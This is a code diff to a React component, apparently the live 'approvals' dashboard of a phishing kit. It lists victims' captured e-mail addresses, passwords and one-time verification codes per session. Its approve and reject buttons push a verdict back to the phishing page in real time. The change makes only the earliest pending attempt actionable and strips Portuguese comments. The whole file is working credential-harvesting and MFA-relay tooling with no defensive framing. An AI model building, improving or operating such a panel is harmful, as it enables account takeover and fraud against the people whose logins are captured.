@@ -44,7 +44,6 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
   const [actions, setActions] = useState<ActionRow[]>([]);
   const [busy, setBusy] = useState<string | null>(null);
 
-  // Carrega + escuta leads
   useEffect(() => {
     let alive = true;
     (async () => {
@@ -75,7 +74,6 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
     };
   }, [adId]);
 
-  // Carrega + escuta ações
   useEffect(() => {
     let alive = true;
     (async () => {
@@ -101,9 +99,6 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
     };
   }, [adId]);
 
-  // Constrói uma linha por tentativa de código.
-  // Para cada code_submitted, pega: o e-mail mais recente da sessão (até aquele instante)
-  // e a senha mais recente da sessão (até aquele instante).
   const attempts: AttemptRow[] = useMemo(() => {
     const bySession = new Map<string, LeadRow[]>();
     for (const l of leads) {
@@ -124,7 +119,6 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
     for (const [sid, items] of bySession) {
       const codes = items.filter((i) => i.field_name === "code_submitted");
       const acts = (sessionActions.get(sid) || []).slice();
-      // Cada ação resolve a tentativa de código não resolvida mais recente até a ação
       const codeStatus = new Map<string, "approve" | "reject">();
       for (const a of acts) {
         for (let i = codes.length - 1; i >= 0; i--) {
@@ -138,11 +132,9 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
       }
 
       for (const c of codes) {
-        // E-mail mais recente até este código
         const emailRow = [...items]
           .filter((i) => i.field_name === "email_submitted" && i.created_at <= c.created_at)
           .pop();
-        // Senha mais recente até este código
         const passwordRow = [...items]
           .filter((i) => i.field_name === "password_submitted" && i.created_at <= c.created_at)
           .pop();
@@ -191,7 +183,8 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
     );
   }
 
-  const pendingCount = attempts.filter((a) => a.status === "pending").length;
+  const firstPendingIdx = attempts.findIndex((a) => a.status === "pending");
+  const hasPending = firstPendingIdx >= 0;
 
   return (
     <div className="mt-8 rounded-lg border border-border bg-background/50 p-4">
@@ -199,7 +192,7 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
         <ShieldCheck className="h-4 w-4 text-primary" />
         <h3 className="text-sm font-semibold">Aprovações ao vivo</h3>
         <span className="ml-auto text-[10px] uppercase tracking-wide text-muted-foreground">
-          {pendingCount} pendente(s) · {attempts.length} no total
+          {hasPending ? "1 aguardando" : "nenhum aguardando"} · {attempts.length} no total
         </span>
       </div>
 
@@ -216,59 +209,64 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
             </tr>
           </thead>
           <tbody>
-            {attempts.map((row, idx) => (
-              <tr
-                key={`${row.session_id}-${row.codeAt}-${idx}`}
-                className={`border-t border-border ${
-                  row.status === "pending" ? "bg-primary/5" : "bg-card/20"
-                }`}
-              >
-                <td className="px-2 py-2 whitespace-nowrap text-[10px] text-muted-foreground">
-                  {formatTime(row.codeAt)}
-                </td>
-                <td className="px-2 py-2 break-all font-mono text-[11px]">{row.email}</td>
-                <td className="px-2 py-2 break-all font-mono text-[11px]">{row.password}</td>
-                <td className="px-2 py-2 font-mono text-[11px] tracking-widest">{row.code}</td>
-                <td className="px-2 py-2 whitespace-nowrap">
-                  {row.status === "pending" && <span className="text-primary">⏳ aguardando</span>}
-                  {row.status === "approve" && <span className="text-success">✓ aprovado</span>}
-                  {row.status === "reject" && <span className="text-destructive">✗ rejeitado</span>}
-                </td>
-                <td className="px-2 py-2 text-right">
-                  {row.status === "pending" ? (
-                    <div className="flex justify-end gap-1">
-                      <Button
-                        size="sm"
-                        className="h-7 bg-success px-2 text-success-foreground hover:bg-success/90"
-                        onClick={() => send(row.session_id, "approve")}
-                        disabled={busy === `${row.session_id}-approve`}
-                      >
-                        {busy === `${row.session_id}-approve` ? (
-                          <Loader2 className="h-3 w-3 animate-spin" />
-                        ) : (
-                          <Check className="h-3 w-3" />
-                        )}
-                      </Button>
-                      <Button
-                        size="sm"
-                        variant="outline"
-                        className="h-7 border-destructive/40 px-2 text-destructive hover:bg-destructive/10"
-                        onClick={() => send(row.session_id, "reject", "Código inválido")}
-                        disabled={busy === `${row.session_id}-reject`}
-                      >
-                        {busy === `${row.session_id}-reject` ? (
-                          <Loader2 className="h-3 w-3 animate-spin" />
-                        ) : (
-                          <X className="h-3 w-3" />
-                        )}
-                      </Button>
-                    </div>
-                  ) : (
-                    <span className="text-[10px] text-muted-foreground">—</span>
-                  )}
-                </td>
-              </tr>
-            ))}
+            {attempts.map((row, idx) => {
+              const isActionable = idx === firstPendingIdx;
+              const isStalePending = row.status === "pending" && !isActionable;
+              return (
+                <tr
+                  key={`${row.session_id}-${row.codeAt}-${idx}`}
+                  className={`border-t border-border ${
+                    isActionable ? "bg-primary/5" : "bg-card/20"
+                  }`}
+                >
+                  <td className="px-2 py-2 whitespace-nowrap text-[10px] text-muted-foreground">
+                    {formatTime(row.codeAt)}
+                  </td>
+                  <td className="px-2 py-2 break-all font-mono text-[11px]">{row.email}</td>
+                  <td className="px-2 py-2 break-all font-mono text-[11px]">{row.password}</td>
+                  <td className="px-2 py-2 font-mono text-[11px] tracking-widest">{row.code}</td>
+                  <td className="px-2 py-2 whitespace-nowrap">
+                    {isActionable && <span className="text-primary">⏳ aguardando</span>}
+                    {isStalePending && <span className="text-muted-foreground">— ignorado</span>}
+                    {row.status === "approve" && <span className="text-success">✓ aprovado</span>}
+                    {row.status === "reject" && <span className="text-destructive">✗ rejeitado</span>}
+                  </td>
+                  <td className="px-2 py-2 text-right">
+                    {isActionable ? (
+                      <div className="flex justify-end gap-1">
+                        <Button
+                          size="sm"
+                          className="h-7 bg-success px-2 text-success-foreground hover:bg-success/90"
+                          onClick={() => send(row.session_id, "approve")}
+                          disabled={busy === `${row.session_id}-approve`}
+                        >
+                          {busy === `${row.session_id}-approve` ? (
+                            <Loader2 className="h-3 w-3 animate-spin" />
+                          ) : (
+                            <Check className="h-3 w-3" />
+                          )}
+                        </Button>
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          className="h-7 border-destructive/40 px-2 text-destructive hover:bg-destructive/10"
+                          onClick={() => send(row.session_id, "reject", "Código inválido")}
+                          disabled={busy === `${row.session_id}-reject`}
+                        >
+                          {busy === `${row.session_id}-reject` ? (
+                            <Loader2 className="h-3 w-3 animate-spin" />
+                          ) : (
+                            <X className="h-3 w-3" />
+                          )}
+                        </Button>
+                      </div>
+                    ) : (
+                      <span className="text-[10px] text-muted-foreground">—</span>
+                    )}
+                  </td>
+                </tr>
+              );
+            })}
           </tbody>
         </table>
       </div>
